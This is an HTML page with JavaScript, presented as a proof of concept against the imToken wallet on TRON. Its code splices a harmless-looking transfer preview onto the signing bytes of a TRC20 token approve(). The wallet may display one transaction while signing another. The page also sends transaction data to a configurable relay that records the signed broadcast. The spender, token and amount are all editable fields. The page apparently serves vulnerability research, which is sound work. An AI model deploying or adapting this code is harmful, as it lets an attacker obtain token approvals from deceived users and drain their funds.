<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>TRON raw_data/raw_data_hex signature capture PoC</title>
    <style>
      body {
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
        margin: 18px;
        color: #111827;
      }
      label {
        display: block;
        margin: 10px 0 4px;
        font-size: 13px;
      }
      input {
        box-sizing: border-box;
        width: min(760px, 100%);
        padding: 8px;
      }
      button {
        margin-top: 14px;
        padding: 10px 14px;
      }
      pre {
        white-space: pre-wrap;
        word-break: break-word;
        background: #f3f4f6;
        padding: 12px;
      }
    </style>
  </head>
  <body>
    <label>Relay / RPC URL</label>
    <input id="relayUrl" value="https://YOUR-RELAY.example" />

    <label>Preview recipient (shown as TransferContract)</label>
    <input id="previewRecipient" value="T9yD14Nj9j7xAB4dbGeiX9h8unkKHxuWwb" />

    <label>Preview amount in sun</label>
    <input id="previewAmount" value="10000" />

    <label>TRC20 token contract</label>
    <input id="tokenContract" value="TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t" />

    <label>Approve spender (blank = current wallet)</label>
    <input id="spender" placeholder="defaults to current address" />

    <label>Approve amount</label>
    <input id="approveAmount" value="1" />

    <button id="runBtn">Run Capture PoC</button>

    <pre id="status"></pre>
    <pre id="previewTx"></pre>
    <pre id="approveTx"></pre>

    <script>
      const $ = (id) => document.getElementById(id);
      const statusEl = $('status');
      const previewEl = $('previewTx');
      const approveEl = $('approveTx');
      const runBtn = $('runBtn');

      function setStatus(value) {
        statusEl.textContent = value;
      }

      function safeStringify(value) {
        return JSON.stringify(value, null, 2);
      }

      function rpcUrl() {
        return $('relayUrl').value.trim().replace(/\/$/, '');
      }

      function getCurrentAccount() {
        const account = window.tronWeb?.defaultAddress?.base58;
        if (!account) {
          throw new Error('No TRON account detected. Open this page inside imToken with a TRON wallet selected.');
        }
        return account;
      }

      async function postJson(url, body) {
        const response = await fetch(url, {
          method: 'POST',
          headers: { 'content-type': 'application/json' },
          body: JSON.stringify(body),
        });
        const text = await response.text();
        let json;
        try {
          json = JSON.parse(text);
        } catch (error) {
          throw new Error(`Non-JSON response from ${url}: ${text.slice(0, 300)}`);
        }
        if (!response.ok) {
          throw new Error(`HTTP ${response.status} from ${url}: ${safeStringify(json)}`);
        }
        return json;
      }

      function encodeApproveParams(spender, amount) {
        const spenderHex = window.tronWeb.address
          .toHex(spender)
          .replace(/^41/, '')
          .padStart(64, '0');
        const amountHex = BigInt(amount).toString(16).padStart(64, '0');
        return spenderHex + amountHex;
      }

      async function buildPreviewTransfer(from) {
        const result = await postJson(`${rpcUrl()}/wallet/createtransaction`, {
          owner_address: from,
          to_address: $('previewRecipient').value.trim(),
          amount: Number($('previewAmount').value.trim()),
          visible: true,
        });
        if (result.Error) throw new Error(`createtransaction failed: ${result.Error}`);
        return result;
      }

      async function buildApprove(from, spender) {
        const result = await postJson(`${rpcUrl()}/wallet/triggersmartcontract`, {
          owner_address: from,
          contract_address: $('tokenContract').value.trim(),
          function_selector: 'approve(address,uint256)',
          parameter: encodeApproveParams(spender, $('approveAmount').value.trim()),
          fee_limit: 100000000,
          call_value: 0,
          visible: true,
        });
        if (!result?.result?.result || !result?.transaction?.raw_data_hex) {
          throw new Error(`triggersmartcontract failed: ${safeStringify(result)}`);
        }
        return result;
      }

      function buildMismatchedTx(previewTransfer, approveTx) {
        return {
          ...approveTx.transaction,
          raw_data: previewTransfer.raw_data,
          raw_data_hex: approveTx.transaction.raw_data_hex,
          txID: approveTx.transaction.txID,
        };
      }

      function describeContract(rawData) {
        const contract = rawData?.contract?.[0] || {};
        const value = contract.parameter?.value || {};
        return {
          type: contract.type,
          owner_address: value.owner_address,
          to_address: value.to_address,
          contract_address: value.contract_address,
          amount: value.amount,
          data_selector: value.data ? value.data.slice(0, 8) : undefined,
        };
      }

      function callSendTransaction(account, tx) {
        const params = { from: account, tx, useTronHeader: true };

        if (window.imToken?.callPromisifyAPI) {
          return window.imToken.callPromisifyAPI('tron.sendTransaction', params);
        }

        if (window.imToken?.callAPI) {
          return new Promise((resolve, reject) => {
            window.imToken.callAPI('tron.sendTransaction', params, (error, result) => {
              if (error) reject(error);
              else resolve(result);
            });
          });
        }

        throw new Error('imToken bridge is unavailable.');
      }

      async function run() {
        runBtn.disabled = true;
        try {
          const account = getCurrentAccount();
          const spender = $('spender').value.trim() || account;

          setStatus('Building transfer preview and approve raw_data_hex through relay...');

          const previewTransfer = await buildPreviewTransfer(account);
          previewEl.textContent = safeStringify({
            txID: previewTransfer.txID,
            raw_data: previewTransfer.raw_data,
          });

          const approveTx = await buildApprove(account, spender);
          const approveData = approveTx.transaction.raw_data.contract[0].parameter.value.data;
          approveEl.textContent = safeStringify({
            txID: approveTx.transaction.txID,
            selector: approveData.slice(0, 8),
            raw_data_hex: approveTx.transaction.raw_data_hex,
            raw_data: approveTx.transaction.raw_data,
          });

          if (approveData.slice(0, 8).toLowerCase() !== '095ea7b3') {
            throw new Error(`Unexpected approve selector: ${approveData.slice(0, 8)}`);
          }

          await postJson(`${rpcUrl()}/__poc/registerApprove`, {
            txID: approveTx.transaction.txID,
            raw_data: approveTx.transaction.raw_data,
            raw_data_hex: approveTx.transaction.raw_data_hex,
          });

          const tx = buildMismatchedTx(previewTransfer, approveTx);
          setStatus(
            [
              'Now calling imToken tron.sendTransaction with a mismatched tx.',
              '',
              'Expected wallet display source: raw_data transfer',
              safeStringify(describeContract(tx.raw_data)),
              '',
              'Expected signing source candidate: raw_data_hex approve',
              safeStringify(describeContract(approveTx.transaction.raw_data)),
              '',
              'Confirm only if the wallet prompt displays the transfer. Then check relay stdout/captures.jsonl.',
            ].join('\n')
          );

          const result = await callSendTransaction(account, tx);
          setStatus(
            [
              'sendTransaction returned:',
              safeStringify(result),
              '',
              'Check the relay server. If /wallet/broadcasttransaction was captured with signatureCount > 0 and raw_data_hex selector 095ea7b3, the DApp did not receive the signature directly, but the broadcast endpoint did.',
            ].join('\n')
          );
        } catch (error) {
          console.error(error);
          setStatus(`Error: ${error?.message || String(error)}`);
        } finally {
          runBtn.disabled = false;
        }
      }

      runBtn.addEventListener('click', run);
    </script>
  </body>
</html>
